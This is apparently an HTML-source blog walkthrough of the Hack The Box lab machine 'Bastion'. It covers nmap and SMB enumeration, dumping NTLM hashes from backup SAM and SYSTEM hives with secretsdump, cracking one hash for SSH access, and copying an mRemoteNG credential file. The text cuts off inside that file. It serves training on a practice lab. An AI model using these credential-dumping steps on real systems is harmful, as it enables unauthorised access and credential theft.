-&lt;p&gt;&lt;br /&gt;Hey guys, this is my second post for Bastion, in the &lt;a href=&quot;/hack-the-box/bastion&quot;&gt;first post&lt;/a&gt; I solved it with kali, in this one I will solve it with CommandoVM. Bastion’s ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.134&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\System32\drivers\etc\hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;bastion.htb&lt;/code&gt;. Let’s jump right in !
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/0.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;We will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\rick\Desktop\HTB\boxes\bastion&amp;gt;nmap -sV -sT -sC -o nmapinitial bastion.htb
-Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-06 16:23 Egypt Standard Time
-Nmap scan report for bastion.htb (10.10.10.134)
-Host is up (0.49s latency).
-Other addresses for bastion.htb (not scanned): 10.10.10.134
-Not shown: 996 filtered ports
-PORT    STATE SERVICE      VERSION
-22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
-| ssh-hostkey:
-|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
-|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
-|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
-135/tcp open  msrpc        Microsoft Windows RPC
-139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
-445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
-Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-|_clock-skew: mean: -39m58s, deviation: 1h09m14s, median: 0s
-| smb-os-discovery:
-|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
-|   Computer name: Bastion
-|   NetBIOS computer name: BASTION\x00
-|   Workgroup: WORKGROUP\x00
-|_  System time: 2019-09-06T16:33:24+02:00
-| smb-security-mode:
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-| smb2-security-mode:
-|   2.02:
-|_    Message signing enabled but not required
-| smb2-time:
-|   date: 2019-09-06 16:33:26
-|_  start_date: 2019-09-06 16:11:05
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 627.77 seconds
-
-COMMANDO Fri 09/06/2019 16:33:55.66
-C:\Users\rick\Desktop\HTB\boxes\bastion&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;Only &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;, let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;.
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;smb&quot;&gt;SMB&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;Let’s list the available shares :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\rick\Desktop\HTB\boxes\bastion&amp;gt;net view bastion.htb
-Shared resources at bastion.htb
-
-
-
-Share name  Type  Used as  Comment
-
--------------------------------------------------------------------------------
-Backups     Disk
-The command completed successfully.
-
-
-COMMANDO Fri 09/06/2019 16:37:25.73
-C:\Users\rick\Desktop\HTB\boxes\bastion&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;We can access one share : &lt;code class=&quot;highlighter-rouge&quot;&gt;Backups&lt;/code&gt;, let’s mount it :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/1.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/2.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;There’s an interesting text file called &lt;code class=&quot;highlighter-rouge&quot;&gt;note.txt&lt;/code&gt; :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/3.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\&lt;/code&gt; I found two &lt;code class=&quot;highlighter-rouge&quot;&gt;vhd&lt;/code&gt; images :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/4.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/5.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/6.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;Those are the backup images, as you can see &lt;code class=&quot;highlighter-rouge&quot;&gt;9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd&lt;/code&gt; has a very large size and as the note said downloading it will take a very long time, so a better solution is to mount it :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/7.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/8.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;dumping-credentials&quot;&gt;Dumping Credentials&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;Users&lt;/code&gt; directory had nothing interesting so I started searching in the system files. I could copy &lt;code class=&quot;highlighter-rouge&quot;&gt;SYSTEM&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;SAM&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;Windows\System32\config&lt;/code&gt; :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/9.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;Then by using &lt;code class=&quot;highlighter-rouge&quot;&gt;secretsdump&lt;/code&gt; I could dump the password hashes :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\rick\Desktop\HTB\boxes\bastion&amp;gt;C:\Tools\impacket-examples-windows\secretsdump.exe LOCAL -system C:\Users\rick\Desktop\HTB\boxes\bastion\SYSTEM -sam C:\Users\rick\Desktop\HTB\boxes\bastion\SAM
-Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
-
-[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
-[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:e4487d0421e6611a364a5028467e053c:::
-L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
-[*] Cleaning up...
-
-COMMANDO Fri 09/06/2019 16:59:30.97
-C:\Users\rick\Desktop\HTB\boxes\bastion&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;I cracked &lt;code class=&quot;highlighter-rouge&quot;&gt;l4mpje&lt;/code&gt;’s hash with &lt;a href=&quot;https://crackstation.net&quot;&gt;Crackstation&lt;/a&gt; :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/10.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;Then I could &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; to the box :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/11.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;We owned user.
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;By checking the application data for &lt;code class=&quot;highlighter-rouge&quot;&gt;l4mpje&lt;/code&gt; I saw that &lt;code class=&quot;highlighter-rouge&quot;&gt;mRemoteNG&lt;/code&gt; was installed :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming&amp;gt;dir
- Volume in drive C has no label.
- Volume Serial Number is 0CB3-C487
-
- Directory of C:\Users\L4mpje\AppData\Roaming
-
-22-02-2019  15:01    &amp;lt;DIR&amp;gt;          .
-22-02-2019  15:01    &amp;lt;DIR&amp;gt;          ..
-22-02-2019  14:50    &amp;lt;DIR&amp;gt;          Adobe
-22-02-2019  15:03    &amp;lt;DIR&amp;gt;          mRemoteNG
-               0 File(s)              0 bytes
-               4 Dir(s)  11.236.425.728 bytes free
-
-l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;mRemoteNG is a fork of mRemote: an open source, tabbed, multi-protocol, remote connections manager. mRemoteNG adds bug fixes and new features to mRemote.&lt;/p&gt;
-
-  &lt;p&gt;It allows you to view all of your remote connections in a simple yet powerful tabbed interface. -&lt;a href=&quot;https://mremoteng.org/&quot;&gt;mremoteng.org&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mRemoteNG&lt;/code&gt; stores connections info and credentials in a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;confCons.xml&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG&amp;gt;dir
- Volume in drive C has no label.
- Volume Serial Number is 0CB3-C487
-
- Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG
-
-22-02-2019  15:03    &amp;lt;DIR&amp;gt;          .
-22-02-2019  15:03    &amp;lt;DIR&amp;gt;          ..
-22-02-2019  15:03             6.316 confCons.xml
-22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup
-22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup
-22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup
-22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup
-22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup
-22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup
-22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup
-22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup
-22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup
-22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup
-22-02-2019  15:03                51 extApps.xml
-22-02-2019  15:03             5.217 mRemoteNG.log
-22-02-2019  15:03             2.245 pnlLayout.xml
-22-02-2019  15:01    &amp;lt;DIR&amp;gt;          Themes
-              14 File(s)         76.577 bytes
-               3 Dir(s)  11.236.425.728 bytes free
-
-l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;I downloaded it with &lt;code class=&quot;highlighter-rouge&quot;&gt;scp&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\rick\Desktop\HTB\boxes\bastion&amp;gt;scp l4mpje@bastion.htb:/Users/L4mpje/AppData/Roaming/mRemoteNG/confCons.xml .
-l4mpje@bastion.htb's password:
-confCons.xml                                                                                                                                                                                               100% 6316    12.9KB/s   00:00     
-COMMANDO Fri 09/06/2019 17:15:08.69
-C:\Users\rick\Desktop\HTB\boxes\bastion&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;confCons.xml&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;mrng:Connections&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:mrng=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://mremoteng.org&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Connections&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Export=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;EncryptionEngine=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;AES&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;BlockCipherMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GCM&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;KdfIterations=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1000&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;FullFileEncryption=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Protected=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ConfVersion=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2.6&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Node&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;DC&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Connection&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Descr=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Icon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mRemoteNG&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Panel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;General&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;500e7d58-662a-44d4-aff0-3a4f547a3fee&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Username=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Administrator&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Domain=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Password=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Hostname=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Protocol=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RDP&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;PuttySession=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Default Settings&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Port=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;3389&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ConnectToConsole=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;UseCredSsp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RenderingEngine=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IE&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ICAEncryptionStrength=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EncrBasic&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDPAuthenticationLevel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;NoAuth&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDPMinutesToIdleTimeout=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDPAlertIdleTimeout=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;LoadBalanceInfo=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Colors=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Colors16Bit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Resolution=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;FitToWindow&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;AutomaticResize=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;DisplayWallpaper=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;DisplayThemes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;EnableFontSmoothing=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;EnableDesktopComposition=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;CacheBitmaps=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RedirectDiskDrives=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RedirectPorts=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RedirectPrinters=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RedirectSmartCards=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RedirectSound=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;DoNotPlay&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;SoundQuality=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Dynamic&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RedirectKeys=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Connected=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;PreExtApp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;PostExtApp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;MacAddress=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;UserField=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ExtApp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCCompression=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CompNone&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCEncoding=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EncHextile&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCAuthMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;AuthVNC&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCProxyType=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ProxyNone&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCProxyIP=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCProxyPort=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCProxyUsername=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCProxyPassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCColors=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ColNormal&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCSmartSizeMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SmartSAspect&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCViewOnly=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDGatewayUsageMethod=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Never&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDGatewayHostname=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDGatewayUseConnectionCredentials=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Yes&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDGatewayUsername=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDGatewayPassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDGatewayDomain=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritCacheBitmaps=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritColors=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritDescription=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritDisplayThemes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritDisplayWallpaper=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritEnableFontSmoothing=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritEnableDesktopComposition=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritDomain=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritIcon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritPanel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritPassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritPort=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritProtocol=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritPuttySession=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRedirectDiskDrives=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRedirectKeys=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRedirectPorts=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRedirectPrinters=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRedirectSmartCards=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRedirectSound=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritSoundQuality=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritResolution=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritAutomaticResize=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritUseConsoleSession=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritUseCredSsp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRenderingEngine=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritUsername=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritICAEncryptionStrength=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDPAuthenticationLevel=&lt;/span&gt;&lt;span 